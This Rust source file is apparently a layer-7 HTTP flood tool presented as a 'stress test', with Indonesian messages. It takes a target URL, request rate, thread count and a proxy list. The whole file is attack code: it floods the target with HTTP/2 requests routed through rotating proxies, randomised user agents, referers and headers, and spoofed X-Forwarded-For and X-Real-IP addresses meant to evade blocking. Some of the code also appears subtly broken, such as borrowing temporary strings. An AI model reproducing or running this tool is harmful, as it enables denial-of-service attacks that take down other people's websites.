use std::{env, fs, sync::Arc, time::{Duration, Instant}};
use rand::{seq::SliceRandom, Rng};
use reqwest::{Client, Proxy};
use tokio::sync::Semaphore;
use futures::stream::{FuturesUnordered, StreamExt};

// Load file into a Vec<String>
fn load_file(filename: &str) -> Vec<String> {
    fs::read_to_string(filename)
        .unwrap_or_default()
        .lines()
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect()
}

// Generate random IP address for spoofing
fn random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!(
        "{}.{}.{}.{}",
        rng.gen_range(1..255),
        rng.gen_range(0..255),
        rng.gen_range(0..255),
        rng.gen_range(1..255)
    )
}

// HTTP stress testing function
async fn http_stress(
    url_target: String,
    duration_sec: u64,
    rps: usize,
    concurrency: usize,
    proxies: Arc<Vec<String>>,
    referers: Arc<Vec<String>>,
    user_agents: Arc<Vec<String>>,
    paths: Arc<Vec<String>>,
    ciphers: Arc<Vec<String>>,
    sigalgs: Arc<Vec<String>>,
    lang_header: Arc<Vec<String>>,
    accept_header: Arc<Vec<String>>,
    encoding_header: Arc<Vec<String>>,
    controle_header: Arc<Vec<String>>,
) {
    let client = Arc::new(
        Client::builder()
            .pool_idle_timeout(Duration::from_secs(120))
            .danger_accept_invalid_certs(true)
            .http2_prior_knowledge()
            .build()
            .unwrap(),
    );

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let start = Instant::now();

    let mut handles = Vec::with_capacity(concurrency);

    let rps_per_thread = rps / concurrency.max(1);

    for _ in 0..concurrency {
        let client = Arc::clone(&client);
        let semaphore = Arc::clone(&semaphore);
        let proxies = Arc::clone(&proxies);
        let referers = Arc::clone(&referers);
        let user_agents = Arc::clone(&user_agents);
        let paths = Arc::clone(&paths);
        let ciphers = Arc::clone(&ciphers);
        let sigalgs = Arc::clone(&sigalgs);
        let lang_header = Arc::clone(&lang_header);
        let accept_header = Arc::clone(&accept_header);
        let encoding_header = Arc::clone(&encoding_header);
        let controle_header = Arc::clone(&controle_header);
        let url_target = url_target.clone();

        handles.push(tokio::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();
            let mut rng = rand::thread_rng();

            while start.elapsed().as_secs() < duration_sec {
                let mut batch = FuturesUnordered::new();
                for _ in 0..rps_per_thread.max(1) {
                    let path = paths.choose(&mut rng).unwrap_or(&"/".to_string());
                    let url = format!("{}{}", url_target, path);
                    let user_agent = user_agents.choose(&mut rng).unwrap_or(&"Mozilla/5.0".to_string());
                    let referer = referers.choose(&mut rng).unwrap_or(&"https://google.com".to_string());
                    let cipher = ciphers.choose(&mut rng).unwrap_or(&"TLS_AES_128_GCM_SHA256".to_string());
                    let sigalg = sigalgs.choose(&mut rng).unwrap_or(&"ecdsa_secp256r1_sha256".to_string());
                    let lang = lang_header.choose(&mut rng).unwrap_or(&"en-US,en;q=0.5".to_string());
                    let accept = accept_header.choose(&mut rng).unwrap_or(&"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8".to_string());
                    let encoding = encoding_header.choose(&mut rng).unwrap_or(&"gzip, deflate, br".to_string());
                    let controle = controle_header.choose(&mut rng).unwrap_or(&"no-cache".to_string());

                    let client = if !proxies.is_empty() {
                        let proxy = proxies.choose(&mut rng).unwrap();
                        Arc::new(
                            Client::builder()
                                .danger_accept_invalid_certs(true)
                                .http2_prior_knowledge()
                                .proxy(Proxy::all(proxy).unwrap())
                                .build()
                                .unwrap(),
                        )
                    } else {
                        Arc::clone(&client)
                    };

                    let fake_ip = random_ip();
                    let mut req = client
                        .get(&url)
                        .timeout(Duration::from_secs(4))
                        .header("User-Agent", user_agent)
                        .header("Referer", referer)
                        .header("X-Forwarded-For", &fake_ip)
                        .header("X-Real-IP", &fake_ip)
                        .header("Accept", accept)
                        .header("Accept-Encoding", encoding)
                        .header("Accept-Language", lang)
                        .header("Cache-Control", controle)
                        .header("TLS-Cipher", cipher)
                        .header("TLS-SigAlg", sigalg);

                    batch.push(req.send());
                }
                while let Some(res) = batch.next().await {
                    match res {
                        Ok(_) => continue,
                        Err(_) => continue,
                    };
                }
            }
        }));
    }
    futures::future::join_all(handles).await;
    println!("[HTTP] DONE! Stress test selesai untuk target: {}", url_target);
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} [rps] threads proxies.txt [link web aku]", args[0]);
        std::process::exit(1);
    }

    let rps: usize = args[1].parse().unwrap();
    let threads: usize = args[2].parse().unwrap();
    let proxyfile = &args[3];
    let http_target = &args[4];
    let duration_sec = 30;

    let proxies = Arc::new(load_file(proxyfile));
    let referers = Arc::new(load_file("referers.txt"));
    let user_agents = Arc::new(load_file("useragents.txt"));
    let paths = Arc::new(load_file("paths.txt"));
    let ciphers = Arc::new(load_file("ciphers.txt"));
    let sigalgs = Arc::new(load_file("sigalgs.txt"));
    let lang_header = Arc::new(load_file("lang_header.txt"));
    let accept_header = Arc::new(load_file("accept_header.txt"));
    let encoding_header = Arc::new(load_file("encoding_header.txt"));
    let controle_header = Arc::new(load_file("controle_header.txt"));

    println!("Proxies loaded: {} entries", proxies.len());
    println!("Referers loaded: {} entries", referers.len());
    println!("User Agents loaded: {} entries", user_agents.len());
    println!("Paths loaded: {} entries", paths.len());
    println!("Target: {http_target}, RPS: {rps}, Threads: {threads}, Duration: {duration_sec}s");

    http_stress(
        http_target.to_string(),
        duration_sec,
        rps,
        threads,
        proxies,
        referers,
        user_agents,
        paths,
        ciphers,
        sigalgs,
        lang_header,
        accept_header,
        encoding_header,
        controle_header,
    )
    .await;
    println!("SELESAI!");
}